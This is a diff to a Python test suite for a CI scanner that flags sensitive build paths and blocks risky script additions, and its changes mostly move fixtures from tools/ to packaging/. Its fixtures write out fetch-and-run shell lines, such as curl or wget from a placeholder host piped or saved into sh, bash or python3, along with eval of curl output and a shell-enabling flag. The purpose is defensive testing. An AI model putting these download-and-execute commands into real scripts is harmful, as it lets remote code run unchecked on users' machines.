@@ -307,6 +307,29 @@ class SensitiveSurfaces(ScannerTestCase):
         self.assertSensitive(result)
 
 
+class AutomationAndToolchainPaths(ScannerTestCase):
+    """CI executes more than scripts/, and consumes pinned toolchains."""
+
+    def test_tool_and_tools_trees_are_automation(self):
+        for path in ("tool/version_from_tag.dart", "tools/large_library/gen.py"):
+            with self.subTest(path):
+                self.assertSensitive(self.build({}, {path: "// new\n"}))
+
+    def test_gradle_wrapper_is_sensitive(self):
+        """distributionUrl chooses where Gradle itself is downloaded from."""
+        base = {"android/gradle/wrapper/gradle-wrapper.properties": "distributionUrl=https://services.gradle.org/a.zip\n"}
+        head = {"android/gradle/wrapper/gradle-wrapper.properties": "distributionUrl=https://example.invalid/a.zip\n"}
+        self.assertSensitive(self.build(base, head))
+
+    def test_toolchain_version_pins_are_sensitive(self):
+        for path in (".flutter-version", ".java-version"):
+            with self.subTest(path):
+                self.assertSensitive(self.build({path: "1\n"}, {path: "2\n"}))
+
+    def test_ordinary_dotfiles_are_not_swept_up(self):
+        self.assertOrdinary(self.build({}, {".gitignore": "build/\n"}))
+
+
 class BlockedAdditions(ScannerTestCase):
     def test_direct_process_run(self):
         self.assertBlocked(
@@ -366,17 +389,35 @@ class BlockedAdditions(ScannerTestCase):
             blocked("eval \"$", "(curl -s https://example.invalid/env)\"\n"),
         ):
             with self.subTest(snippet=snippet.strip()):
-                self.assertBlocked(self.build({}, {"tools/install.sh": "#!/bin/sh\n" + snippet}))
+                self.assertBlocked(self.build({}, {"packaging/install.sh": "#!/bin/sh\n" + snippet}))
 
     def test_pipe_into_an_interpreter_reached_by_path(self):
         snippet = blocked("curl -fsSL https://example.invalid/i.sh ", "|", " /bin/sh\n")
-        self.assertBlocked(self.build({}, {"tools/p.sh": "#!/bin/sh\n" + snippet}))
+        self.assertBlocked(self.build({}, {"packaging/p.sh": "#!/bin/sh\n" + snippet}))
 
     def test_blocked_patterns_are_not_bypassable_by_approval(self):
         """A blocked verdict is a non-zero exit, which no approval step can clear."""
         result = self.build({}, {"lib/a.dart": f"final run = {PROCESS_RUN};\n"})
         self.assertEqual(result.returncode, 1)
         self.assertIn("an approval does not bypass them", result.report)
+
+
+class ShellFlagValues(ScannerTestCase):
+    """The blocker is about enabling a shell, not naming the flag."""
+
+    FLAG = blocked("runIn", "Shell")
+
+    def test_enabled_is_blocked(self):
+        self.assertBlocked(self.build({}, {"lib/a.dart": f"var o = {self.FLAG}: true;\n"}))
+
+    def test_variable_value_is_blocked(self):
+        """Unjudgeable from here, so it stays blocked."""
+        self.assertBlocked(self.build({}, {"lib/a.dart": f"var o = {self.FLAG}: allowShell;\n"}))
+
+    def test_explicitly_disabled_is_not_blocked(self):
+        """Shell execution stays off, and an approval could not clear a block."""
+        result = self.build({}, {"lib/a.dart": f"var o = {self.FLAG}: false;\n"})
+        self.assertFalse(result.blocked, result.report)
 
 
 class DiffEvasion(ScannerTestCase):
@@ -436,11 +477,11 @@ class MultiLineConstructs(ScannerTestCase):
 
     def test_shell_backslash_continuation(self):
         snippet = blocked("curl -fsSL https://example.invalid/i.sh \\\n  ", "|", " sh\n")
-        self.assertBlocked(self.build({}, {"tools/i.sh": "#!/bin/sh\n" + snippet}))
+        self.assertBlocked(self.build({}, {"packaging/i.sh": "#!/bin/sh\n" + snippet}))
 
     def test_shell_pipe_at_end_of_line(self):
         snippet = blocked("curl -fsSL https://example.invalid/j.sh ", "|", "\n  bash\n")
-        self.assertBlocked(self.build({}, {"tools/j.sh": "#!/bin/sh\n" + snippet}))
+        self.assertBlocked(self.build({}, {"packaging/j.sh": "#!/bin/sh\n" + snippet}))
 
     def test_construct_split_across_two_hunks(self):
         """--unified=0 puts untouched lines between the halves; grouping by file
@@ -459,13 +500,13 @@ class MultiLineConstructs(ScannerTestCase):
     def test_logical_or_does_not_look_like_a_pipe_to_an_interpreter(self):
         """`curl ... ||` + newline + `sh x` is a fallback, not a pipe into sh."""
         snippet = "#!/bin/sh\ncurl -fsSL https://example.invalid/probe ||\n  sh ./fallback.sh\n"
-        self.assertOrdinary(self.build({}, {"tools/probe.sh": snippet}))
+        self.assertOrdinary(self.build({}, {"packaging/probe.sh": snippet}))
 
     def test_unrelated_pipe_far_below_a_curl_does_not_match(self):
         lines = ["#!/bin/sh", "curl -fsSL https://example.invalid/data -o /tmp/d"]
         lines += [f"echo step {n}" for n in range(20)]
         lines += ["cat /tmp/d | sh_report --summary"]
-        self.assertOrdinary(self.build({}, {"tools/report.sh": "\n".join(lines) + "\n"}))
+        self.assertOrdinary(self.build({}, {"packaging/report.sh": "\n".join(lines) + "\n"}))
 
 
 class CommentSeparatedTokens(ScannerTestCase):
@@ -503,32 +544,32 @@ class DownloadThenExecute(ScannerTestCase):
 
     def test_and_chained_on_one_line(self):
         script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/i && ", "sh", " /tmp/i\n")
-        self.assertBlocked(self.build({}, {"tools/a.sh": script}))
+        self.assertBlocked(self.build({}, {"packaging/a.sh": script}))
 
     def test_split_across_lines(self):
         script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/j\n", "bash", " /tmp/j\n")
-        self.assertBlocked(self.build({}, {"tools/b.sh": script}))
+        self.assertBlocked(self.build({}, {"packaging/b.sh": script}))
 
     def test_wget_output_flag(self):
         script = blocked(f"#!/bin/sh\nwget -O /tmp/k {self.URL}\n", "bash", " /tmp/k\n")
-        self.assertBlocked(self.build({}, {"tools/c.sh": script}))
+        self.assertBlocked(self.build({}, {"packaging/c.sh": script}))
 
     def test_shell_redirect_to_file(self):
         script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} > /tmp/m; ", "python3", " /tmp/m\n")
-        self.assertBlocked(self.build({}, {"tools/d.sh": script}))
+        self.assertBlocked(self.build({}, {"packaging/d.sh": script}))
 
     def test_chmod_then_direct_execution(self):
         script = f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/n\nchmod +x /tmp/n\n/tmp/n\n"
-        self.assertBlocked(self.build({}, {"tools/e.sh": script}))
+        self.assertBlocked(self.build({}, {"packaging/e.sh": script}))
 
     def test_interpreter_reached_by_path(self):
         """`/bin/sh` is an interpreter; `report.sh` is a filename."""
         script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/p && /bin/", "bash", " /tmp/p\n")
-        self.assertBlocked(self.build({}, {"tools/g.sh": script}))
+        self.assertBlocked(self.build({}, {"packaging/g.sh": script}))
 
     def test_sudo_interpreter(self):
         script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/q && sudo ", "sh", " /tmp/q\n")
-        self.assertBlocked(self.build({}, {"tools/h.sh": script}))
+        self.assertBlocked(self.build({}, {"packaging/h.sh": script}))
 
     def test_downloaded_file_consumed_by_a_non_interpreter_is_not_blocked(self):
         script = (
@@ -536,40 +577,40 @@ class DownloadThenExecute(ScannerTestCase):
             f"curl -fsSL {self.URL}/d.json -o /tmp/d.json\n"
             "jq . /tmp/d.json\n"
         )
-        self.assertOrdinary(self.build({}, {"tools/i.sh": script}))
+        self.assertOrdinary(self.build({}, {"packaging/i.sh": script}))
 
     def test_quoted_execution_target(self):
         script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/i && ", "sh", ' "/tmp/i"\n')
-        self.assertBlocked(self.build({}, {"tools/qa.sh": script}))
+        self.assertBlocked(self.build({}, {"packaging/qa.sh": script}))
 
     def test_quoted_download_target_unquoted_execution(self):
         script = blocked(f'#!/bin/sh\ncurl -fsSL {self.URL} -o "/tmp/i" && ', "sh", " /tmp/i\n")
-        self.assertBlocked(self.build({}, {"tools/qb.sh": script}))
+        self.assertBlocked(self.build({}, {"packaging/qb.sh": script}))
 
     def test_bundled_short_options(self):
         """`-qO` / `-sLo` bundle the output flag with others."""
         for name, script in (
-            ("tools/ba.sh", blocked(f"#!/bin/sh\nwget -qO /tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
-            ("tools/bb.sh", blocked(f"#!/bin/sh\ncurl -sLo /tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
+            ("packaging/ba.sh", blocked(f"#!/bin/sh\nwget -qO /tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
+            ("packaging/bb.sh", blocked(f"#!/bin/sh\ncurl -sLo /tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
         ):
             with self.subTest(name):
                 self.assertBlocked(self.build({}, {name: script}))
 
     def test_attached_option_value(self):
         script = blocked(f"#!/bin/sh\ncurl -o/tmp/i {self.URL} && ", "sh", " /tmp/i\n")
-        self.assertBlocked(self.build({}, {"tools/bc.sh": script}))
+        self.assertBlocked(self.build({}, {"packaging/bc.sh": script}))
 
     def test_long_output_forms(self):
         for name, script in (
-            ("tools/bd.sh", blocked(f"#!/bin/sh\nwget --output-document=/tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
-            ("tools/be.sh", blocked(f"#!/bin/sh\ncurl --output /tmp/i {self.URL} && ", "bash", " /tmp/i\n")),
+            ("packaging/bd.sh", blocked(f"#!/bin/sh\nwget --output-document=/tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
+            ("packaging/be.sh", blocked(f"#!/bin/sh\ncurl --output /tmp/i {self.URL} && ", "bash", " /tmp/i\n")),
         ):
             with self.subTest(name):
                 self.assertBlocked(self.build({}, {name: script}))
 
     def test_download_without_execution_is_not_blocked(self):
         script = f"#!/bin/sh\nwget -q {self.URL}/archive.tar.gz\ntar xf archive.tar.gz\n"
-        self.assertOrdinary(self.build({}, {"tools/bf.sh": script}))
+        self.assertOrdinary(self.build({}, {"packaging/bf.sh": script}))
 
     def test_downloading_data_and_running_an_unrelated_script_is_not_blocked(self):
         """The backreference is what keeps this rule from over-matching."""
@@ -578,7 +619,7 @@ class DownloadThenExecute(ScannerTestCase):
             f"curl -fsSL {self.URL}/catalog.json -o /tmp/catalog.json\n"
             "bash ./scripts/process_catalog.sh /tmp/catalog.json\n"
         )
-        self.assertOrdinary(self.build({}, {"tools/f.sh": script}))
+        self.assertOrdinary(self.build({}, {"packaging/f.sh": script}))
 
 
 class AddedLineMapping(unittest.TestCase):
